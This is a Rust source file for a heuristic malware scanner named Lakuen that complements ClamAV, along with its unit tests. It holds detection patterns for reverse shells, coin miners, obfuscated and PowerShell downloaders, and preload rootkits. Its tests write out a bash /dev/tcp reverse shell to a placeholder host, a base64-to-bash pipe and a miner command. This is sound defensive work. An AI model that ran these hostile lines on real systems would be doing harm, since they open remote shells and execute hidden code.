//! Lakuen rules: fast, conservative heuristics that complement ClamAV.
//! Dependency-free so it can be tested with plain `rustc --test`.

use std::fs::File;
use std::io::Read;
use std::path::Path;

pub struct Hit {
    pub name: String,
    pub severity: &'static str,
}

/// EICAR test string, stored XOR-encoded so this program itself is never
/// detected as the EICAR test file.
const EICAR_X: [u8; 68] = [
    2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115, 109, 25,
    25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30, 119, 27, 20, 14,
    19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123, 126, 18, 113, 18, 112,
];

pub fn eicar() -> Vec<u8> {
    EICAR_X.iter().map(|b| b ^ 0x5A).collect()
}

const MAX_CONTENT: u64 = 4 * 1024 * 1024;

const SCRIPT_EXT: &[&str] = &[
    "sh", "bash", "zsh", "ksh", "fish", "py", "pl", "rb", "php", "js", "mjs", "vbs", "vbe", "wsf",
    "ps1", "psm1", "bat", "cmd", "desktop", "service", "timer", "hta", "lua",
];
const DOC_EXT: &[&str] = &[
    "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "rtf", "csv", "txt", "jpg",
    "jpeg", "png", "gif", "webp", "mp3", "mp4", "avi", "mkv", "mov", "wav",
];
const EXEC_EXT: &[&str] = &[
    "exe", "scr", "bat", "cmd", "com", "pif", "vbs", "vbe", "js", "jar", "ps1", "lnk", "msi",
    "hta", "wsf", "sh", "desktop", "appimage", "run",
];

fn find(h: &[u8], n: &[u8]) -> bool {
    if n.is_empty() || h.len() < n.len() {
        return false;
    }
    let first = n[0];
    let last = h.len() - n.len();
    let mut i = 0;
    while i <= last {
        match h[i..=last].iter().position(|&b| b == first) {
            Some(p) => {
                i += p;
                if &h[i..i + n.len()] == n {
                    return true;
                }
                i += 1;
            }
            None => return false,
        }
    }
    false
}

fn any(h: &[u8], ns: &[&[u8]]) -> bool {
    ns.iter().any(|n| find(h, n))
}

fn hit(name: &str, severity: &'static str) -> Option<Hit> {
    Some(Hit { name: name.to_string(), severity })
}

/// Rules on file names only (no I/O).
pub fn check_name(path: &Path) -> Option<Hit> {
    let name = path.file_name()?.to_string_lossy().to_string();
    if name.contains('\u{202E}') {
        return hit("Lakuen.Heur.RTLO-Filename", "suspicious");
    }
    let lower = name.to_lowercase();
    let parts: Vec<&str> = lower.split('.').collect();
    if parts.len() >= 3 {
        let last = parts[parts.len() - 1];
        let prev = parts[parts.len() - 2];
        if EXEC_EXT.contains(&last) && DOC_EXT.contains(&prev) {
            return hit("Lakuen.Heur.DoubleExtension", "suspicious");
        }
    }
    None
}

/// Rules on file content.
pub fn check_content(path: &Path, buf: &[u8], is_script: bool) -> Option<Hit> {
    let eicar = eicar();
    if buf.len() <= 4096 && buf.starts_with(&eicar) {
        return hit("Lakuen.Test.EICAR", "infected");
    }

    let p = path.to_string_lossy();
    let in_tmp = p.starts_with("/tmp/") || p.starts_with("/var/tmp/") || p.starts_with("/dev/shm/");
    let hidden = path
        .file_name()
        .map(|n| n.to_string_lossy().starts_with('.'))
        .unwrap_or(false);
    if in_tmp && hidden && buf.starts_with(b"\x7fELF") {
        return hit("Lakuen.Heur.HiddenTmpBinary", "suspicious");
    }

    if !is_script {
        return None;
    }

    if find(buf, b"/dev/tcp/") && any(buf, &[b"bash -i", b"sh -i", b"0>&1", b"exec 5<>"]) {
        return hit("Lakuen.Heur.ReverseShell", "suspicious");
    }
    if any(buf, &[b"stratum+tcp://", b"stratum+ssl://", b"stratum2+tcp://"])
        || (find(buf, b"xmrig") && find(buf, b"--donate-level"))
    {
        return hit("Lakuen.Heur.CoinMiner", "suspicious");
    }
    if any(buf, &[b"base64 -d", b"base64 --decode"])
        && any(buf, &[b"| sh", b"|sh", b"| bash", b"|bash", b"| /bin/sh", b"| /bin/bash"])
    {
        return hit("Lakuen.Heur.ObfuscatedShell", "suspicious");
    }
    if any(buf, &[b"FromBase64String", b"-EncodedCommand", b" -enc "])
        && any(buf, &[b"IEX", b"Invoke-Expression"])
        && any(buf, &[b"Net.WebClient", b"DownloadString", b"Invoke-WebRequest", b"DownloadFile"])
    {
        return hit("Lakuen.Heur.PowerShellDownloader", "suspicious");
    }
    if any(buf, &[b"> /etc/ld.so.preload", b">/etc/ld.so.preload", b">> /etc/ld.so.preload", b"tee /etc/ld.so.preload"]) {
        return hit("Lakuen.Heur.PreloadRootkit", "suspicious");
    }
    let ext = p.rsplit('.').next().unwrap_or("").to_lowercase();
    if ext == "desktop" && find(buf, b"Exec=") && any(buf, &[b"/tmp/", b"/dev/shm/", b"base64 -d"]) {
        return hit("Lakuen.Heur.SuspiciousAutostart", "suspicious");
    }
    None
}

/// Full check: name rules, then content rules with minimal I/O.
pub fn check(path: &Path, size: u64) -> Option<Hit> {
    if let Some(h) = check_name(path) {
        return Some(h);
    }
    if size == 0 || size > MAX_CONTENT {
        return None;
    }
    let ext = path
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    let script_ext = SCRIPT_EXT.contains(&ext.as_str());
    let read_n = if script_ext || size <= 4096 { size } else { 512 };
    let mut f = File::open(path).ok()?;
    let mut buf = Vec::with_capacity(read_n as usize);
    (&mut f).take(read_n).read_to_end(&mut buf).ok()?;
    let shebang = buf.starts_with(b"#!");
    if shebang && !script_ext && (buf.len() as u64) < size {
        let mut rest = Vec::new();
        f.take(MAX_CONTENT).read_to_end(&mut rest).ok()?;
        buf.extend_from_slice(&rest);
    }
    check_content(path, &buf, script_ext || shebang)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn eicar_roundtrip() {
        let e = eicar();
        assert_eq!(e.len(), 68);
        assert!(e.starts_with(b"X5O!P%@AP"));
        let h = check_content(&PathBuf::from("/home/u/eicar.com"), &e, false).unwrap();
        assert_eq!(h.name, "Lakuen.Test.EICAR");
    }

    #[test]
    fn names() {
        assert!(check_name(&PathBuf::from("/x/Rechnung.pdf.exe")).is_some());
        assert!(check_name(&PathBuf::from("/x/archive.tar.gz")).is_none());
        assert!(check_name(&PathBuf::from("/x/game.exe")).is_none());
        assert!(check_name(&PathBuf::from("/x/abc\u{202E}gpj.exe")).is_some());
    }

    #[test]
    fn scripts() {
        let p = PathBuf::from("/home/u/x.sh");
        assert!(check_content(&p, b"bash -i >& /dev/tcp/host/4444 0>&1", true).is_some());
        assert!(check_content(&p, b"echo aGk= | base64 -d | bash", true).is_some());
        assert!(check_content(&p, b"./miner -o stratum+tcp://pool:3333", true).is_some());
        assert!(check_content(&p, b"#!/bin/sh\necho hello\ncurl -fsSL x | sh", true).is_none());
        // not a script: script rules do not apply
        assert!(check_content(&PathBuf::from("/x/a.bin"), b"/dev/tcp/ 0>&1", false).is_none());
    }

    #[test]
    fn tmp_binary() {
        assert!(check_content(&PathBuf::from("/tmp/.x"), b"\x7fELF\x02\x01", false).is_some());
        assert!(check_content(&PathBuf::from("/tmp/x"), b"\x7fELF\x02\x01", false).is_none());
    }
}
